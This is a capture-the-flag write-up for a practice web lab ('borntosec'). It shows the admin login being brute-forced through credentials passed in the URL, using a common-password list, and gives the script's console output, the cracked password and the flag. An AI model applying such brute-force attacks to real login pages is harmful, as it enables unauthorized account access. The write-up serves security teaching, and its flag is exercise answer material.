# Bruteforcing a password
- a method of attempting to gain unauthorized access by systematically trying all possible combinations of characters until the correct password is found
- this trial-and-error attack can be time-consuming, especially if the password is long and complex
- https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force

<b>keywords</b>: bruteforce<br>
<b>attacked site</b>: http://borntosec.42/index.php?page=signin

## Exploit
After logging in with an empty username and password combination, we observe that the credentials are directly passed in the URL:
```
http://borntosec.42/index.php?page=signin&username=&password=&Login=Login#
```
This means we can attempt to brute force our way into the 'admin' account using a custom Python script and a file containing the 1000 most commonly used passwords:
``` shell
└─$ python3 bruteforce.py
Bruteforcing 'admin' on http://borntosec.42
Testing '123456': status 200
    --> diff KO
Testing 'password': status 200
    --> diff KO
Testing '12345678': status 200
    --> diff KO
Testing 'qwerty': status 200
    --> diff KO
Testing '123456789': status 200
    --> diff KO
Testing '12345': status 200
    --> diff KO
Testing '1234': status 200
    --> diff KO
Testing '111111': status 200
    --> diff KO
Testing '1234567': status 200
    --> diff KO
Testing 'dragon': status 200
    --> diff KO
Testing '123123': status 200
    --> diff KO
Testing 'baseball': status 200
    --> diff KO
Testing 'abc123': status 200
    --> diff KO
Testing 'football': status 200
    --> diff KO
Testing 'monkey': status 200
    --> diff KO
Testing 'letmein': status 200
    --> diff KO
Testing '696969': status 200
    --> diff KO
Testing 'shadow': status 200
   --> diff OK
'admin' cracked with password 'shadow'
```
After logging in with the acquired credentials, the flag is displayed:
```
The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## Flag
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
